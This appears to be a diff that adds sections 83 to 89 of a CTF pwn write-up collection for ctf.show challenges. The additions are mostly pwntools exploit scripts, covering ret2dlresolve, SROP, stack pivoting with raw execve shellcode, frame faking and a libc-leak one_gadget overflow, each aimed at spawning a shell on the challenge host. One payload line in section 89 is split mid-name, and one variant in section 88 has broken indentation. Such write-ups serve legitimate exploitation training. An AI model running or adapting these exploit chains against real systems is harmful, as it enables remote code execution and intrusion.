@@ -493,3 +493,378 @@ p.send(b'/bin/sh\x00')
 p.interactive()
 ```
 
+## 83 Partial_RELRO(32)ret2dlresolve
+
+```python
+from pwn import *
+context.log_level = 'debug'
+elf = ELF("./pwn")
+rop = ROP('./pwn')
+dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
+rop.read(0,dlresolve.data_addr)
+rop.ret2dlresolve(dlresolve)
+raw_rop = rop.chain()
+#io = process("./pwn")
+io = remote('pwn.challenge.ctf.show',28179)
+io.recvuntil("PWN!\n")
+payload = flat({0x70:raw_rop,256:dlresolve.payload})
+io.sendline(payload)
+io.interactive()
+```
+
+## 84 NO_RELRO（64）ret2dlresolve
+
+```python
+from pwn import *
+# context.log_level="debug"
+# context.terminal = ["tmux","splitw","-h"]
+context.arch="amd64"
+#io = process("./pwn")
+io = remote('pwn.challenge.ctf.show',28159)
+elf = ELF("./pwn")
+
+bss_addr = elf.bss()
+print(hex(bss_addr))
+csu_front_addr = 0x400750
+csu_end_addr = 0x40076A
+leave_ret  =0x40063c
+poprbp_ret = 0x400588
+def csu(rbx, rbp, r12, r13, r14, r15):
+    # pop rbx, rbp, r12, r13, r14, r15
+    # rbx = 0
+    # rbp = 1, enable not to jump
+    # r12 should be the function that you want to call
+    # rdi = edi = r13d
+    # rsi = r14
+    # rdx = r15
+    payload = p64(csu_end_addr)
+    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += b'a' * 0x38
+    return payload
+
+io.recvuntil('PWN!\n')
+
+# stack privot to bss segment, set rsp = new_stack
+stack_size = 0x200 # new stack size is 0x200
+new_stack = bss_addr+0x100
+
+# modify .dynstr pointer in .dynamic section to a specific location
+rop = ROP("./pwn")
+offset = 112+8
+rop.raw(offset*b'a')
+rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))
+rop.raw(0x400607)
+rop.raw(b"a"*(256-len(rop.chain())))
+print(rop.dump())
+print(len(rop.chain()))
+assert(len(rop.chain())<=256)
+rop.raw(b"a"*(256-len(rop.chain())))
+io.send(rop.chain())
+io.send(p64(0x600B30+0x100))
+
+
+# construct a fake dynstr section
+rop = ROP("./pwn")
+rop.raw(offset*b'a')
+dynstr = elf.get_section_by_name('.dynstr').data()
+dynstr = dynstr.replace(b"read",b"system")
+rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100,len(dynstr)))
+rop.raw(0x400607)
+rop.raw(b"a"*(256-len(rop.chain())))
+io.send(rop.chain())
+io.send(dynstr)
+
+# read /bin/sh\x00
+rop = ROP("./pwn")
+rop.raw(offset*b'a')
+rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100+len(dynstr),len("/bin/sh\x00")))
+rop.raw(0x400607)
+rop.raw(b"a"*(256-len(rop.chain())))
+io.send(rop.chain())
+io.send(b"/bin/sh\x00")
+
+
+rop = ROP("./pwn")
+rop.raw(offset*b'a')
+rop.raw(0x0000000000400771) #pop rsi; pop r15; ret;
+rop.raw(0)
+rop.raw(0)
+rop.raw(0x0000000000400773)
+rop.raw(0x600B30+0x100+len(dynstr))
+rop.raw(0x400516) # the second instruction of read@plt
+rop.raw(0xdeadbeef)
+rop.raw(b'a'*(256-len(rop.chain())))
+print(rop.dump())
+print(len(rop.chain()))
+io.send(rop.chain())
+io.interactive()
+```
+
+## 85 Parti_RELRO（64）ret2dlresolve
+
+```python
+from pwn import *
+context.arch="amd64"
+#io = process("./pwn")
+io = remote('pwn.challenge.ctf.show',28274)
+elf = ELF("./pwn")
+bss_addr = elf.bss()
+csu_front_addr = 0x400780
+csu_end_addr = 0x40079A
+vuln_addr = 0x400637
+def csu(rbx, rbp, r12, r13, r14, r15):
+    # pop rbx, rbp, r12, r13, r14, r15
+    # rbx = 0
+    # rbp = 1, enable not to jump
+    # r12 should be the function that you want to call
+    # rdi = edi = r13d
+    # rsi = r14
+    # rdx = r15
+    payload = p64(csu_end_addr)
+    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += b'\x00' * 0x38
+    return payload
+def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
+    plt0 = elf.get_section_by_name('.plt').header.sh_addr
+    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
+    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size
+    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
+    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size
+    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
+    # construct fake function string
+    func_string_addr = store_addr
+    resolve_data = func_name + b"\x00"
+    # construct fake symbol
+    symbol_addr = store_addr+len(resolve_data)
+    offset = symbol_addr - dynsym
+    pad = syment - offset % syment # align syment size
+    symbol_addr = symbol_addr+pad
+    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
+    symbol_index = (symbol_addr - dynsym)//24
+    resolve_data +=b'\x00'*pad
+    resolve_data += symbol
+    # construct fake reloc
+    reloc_addr = store_addr+len(resolve_data)
+    offset = reloc_addr - rel_plt
+    pad = relaent - offset % relaent # align relaent size
+    reloc_addr +=pad
+    reloc_index = (reloc_addr-rel_plt)//24
+    rinfo = (symbol_index<<32) | 7
+    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
+    resolve_data +=b'\x00'*pad
+    resolve_data +=write_reloc
+    resolve_call = p64(plt0) + p64(reloc_index)
+    return resolve_data, resolve_call
+io.recvuntil('Welcome to CTFshowPWN!\n')
+#gdb.attach(io)
+store_addr = bss_addr+0x100
+sh = b"/bin/sh\x00"
+# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
+rop = ROP("./pwn")
+offset = 112+8
+rop.raw(offset*'\x00')
+resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr,b"system",elf.got["write"])
+rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)+len(sh)))
+rop.raw(vuln_addr)
+rop.raw("\x00"*(256-len(rop.chain())))
+assert(len(rop.chain())<=256)
+io.send(rop.chain())
+
+# send resolve data and /bin/sh
+io.send(resolve_data+sh)
+# rop = ROP("./main_partial_relro_64")
+# rop.raw(offset*'\x00')
+bin_sh_addr = store_addr+len(resolve_data)
+# rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
+# rop.raw(vuln_addr)
+# rop.raw("a"*(256-len(rop.chain())))
+# io.send(rop.chain())
+# io.send(sh)
+# leak link_map addr
+rop = ROP("./pwn")
+rop.raw(offset*'\x00')
+rop.raw(csu(0, 1 ,elf.got['write'],1,0x601008,8))
+rop.raw(vuln_addr)
+rop.raw("\x00"*(256-len(rop.chain())))
+io.send(rop.chain())
+link_map_addr = u64(io.recv(8))
+print(hex(link_map_addr))
+# set l->l_info[VERSYMIDX(DT_VERSYM)] = NULL
+rop = ROP("./pwn")
+rop.raw(offset*'\x00')
+rop.raw(csu(0, 1 ,elf.got['read'],0,link_map_addr+0x1c8,8))
+rop.raw(vuln_addr)
+# rop.raw("a"*(256-len(rop.chain())))
+io.sendline(rop.chain())
+sleep(1)
+io.send(p64(0))
+rop = ROP("./pwn")
+rop.raw(offset*'\x00')
+rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret;
+rop.raw(bin_sh_addr)
+rop.raw(resolve_call)
+# rop.raw('\x00'*(256-len(rop.chain())))
+io.send(rop.chain())
+io.interactive()
+```
+
+## 86 SROP 64
+
+#### 溢出想构造ROP链的话，没有动态链接库，本身程序gadget少得可怜，gadget不足，想ret2syscall的话，syscall的参数rax得是59，rdi得是/bin/sh的地址，rsi和rdx得为零，但相关pop的gadget都没有
+```python
+from pwn import *
+context(os='linux',arch='amd64',log_level='debug')
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show',28139)
+elf = ELF('./pwn')
+
+binsh_offset = 0x100
+frame = SigreturnFrame()
+frame.rax = constants.SYS_execve
+frame.rdi = elf.symbols['global_buf']+0x100
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = elf.symbols['syscall']
+
+payload = bytes(frame).ljust(0x100,b'a')+b'/bin/sh\x00'
+p.recvuntil(b'PWN!\n')
+
+p.send(payload)
+p.sendline(b'cat ctfshow_flag')
+p.interactive()
+```
+
+## 87 stack pivoting 64
+
+#### 可控制的栈溢出字节数较少；开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域；其它漏洞难以利用，劫持栈到堆空间，从而在堆上写ROP以及进行堆漏洞利用
+
+#### 可以控制程序执行流；可以控制rsp指针
+
+```python
+from pwn import *
+#sh = process('./pwn')
+sh = remote('pwn.challenge.ctf.show',28115)
+
+shellcode_x86 = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
+shellcode_x86 += b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
+shellcode_x86 += b"\x0b\xcd\x80"
+
+sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
+jmp_esp = 0x08048d17
+payload = shellcode_x86 + (
+    0x20 - len(shellcode_x86)) * b'b' + b'bbbb' + p32(jmp_esp) + sub_esp_jmp
+sh.sendline(payload)
+sh.sendline(b'cat ctfshow_flag')
+sh.interactive()
+```
+
+## 88 frame faking
+
+```python
+from pwn import *
+context(os='linux',arch='amd64',log_level='debug')
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show',28304)
+elf = ELF('./pwn')
+
+'''
+shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
+shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
+shellcode += "\x0b\xcd\x80"
+'''
+
+shellcode = asm(shellcraft.sh())
+jump_addr = 0x400767
+
+def writebyte(addr,data):
+    payload = str(hex(addr))+' '+str(data)
+    p.recvuntil("What?")
+    p.sendline(payload)
+
+writebyte(jump_addr+1,u32(asm('jmp $-0x4a')[1:].ljust(4,b'\x00')))
+writebyte(jump_addr,u32(asm('jmp $-0x4a')[0:1].ljust(4,b'\x00')))
+
+shell_addr = 0x400769
+
+for chr in shellcode:
+    writebyte(shell_addr,str(chr))
+    shell_addr+=1
+
+writebyte(jump_addr+1,u32(asm('jmp $+0x2')[1:].ljust(4,b'\x00')))
+p.sendline(b'cat ctfshow_flag')
+p.interactive()
+```
+
+或
+
+```python
+#coding:utf8
+from pwn import *
+context(arch = 'amd64',os = 'linux',log_level = 'debug')
+#io = process('./pwn')
+io = remote('127.0.0.1',10000)
+text = 0x400767
+def writeData(addr,data):
+io.sendlineafter('Where What?',hex(addr) + ' ' + str(data))
+writeData(text+1,u32(asm('jnz $-0x4A')[1:].ljust(4,'\x00')))
+writeData(text,u32(asm('jmp $-0x4A')[0:1].ljust(4,'\x00')))
+shellcode = asm('''mov rax,0x0068732f6e69622f
+	push rax
+	mov rdi,rsp
+	mov rax,59
+	xor rsi,rsi
+	mov rdx,rdx
+	syscall
+''')
+shellcode_addr = 0x400769
+i = 0
+for x in shellcode:
+	data = u8(x)
+	writeData(shellcode_addr + i,data)
+	i = i + 1
+writeData(text+1,u32(asm('jnz $+0x2')[1:].ljust(4,'\x00')))
+io.interactive()
+```
+
+## 89 花栈溢出
+
+```python
+from pwn import *
+from LibcSearcher import *
+context(arch = "amd64",os = 'linux',log_level = 'debug')
+#context(arch = "i386",os = 'linux',log_level = 'debug')
+#io = process("./pwn")
+io = remote('pwn.challenge.ctf.show',28227)
+elf = ELF("./pwn")
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+bss_addr = 0x602010
+rdiret = 0x400be3
+rsir15 = 0x400be1
+leave = 0x400ada
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+read_plt = elf.plt['read']
+io.recvuntil('You want to send:')
+io.sendline(str(0x2000))
+
+payload = b'a' * 0x1010 + p64(bss_addr -0x8) + p64(rdiret) + p64(puts_got) + p64(puts_pl
+t)
+payload += p64(rdiret) + p64(0) + p64(rsir15) + p64(bss_addr) + p64(0) + p64(read_plt)
+payload += p64(leave)
+payload = payload.ljust(0x2000,b'a')
+
+io.send(payload)
+io.recvuntil(b"See you next time!\n")
+puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
+libc = LibcSearcher('puts',puts_addr)
+libc_base = puts_addr-libc.dump('puts')
+log.info(hex(libc_base))
+one_gadget = libc_base + 0x10a2fc
+io.send(p64(one_gadget))
+#io.send(payload)
+io.interactive()
+```
+
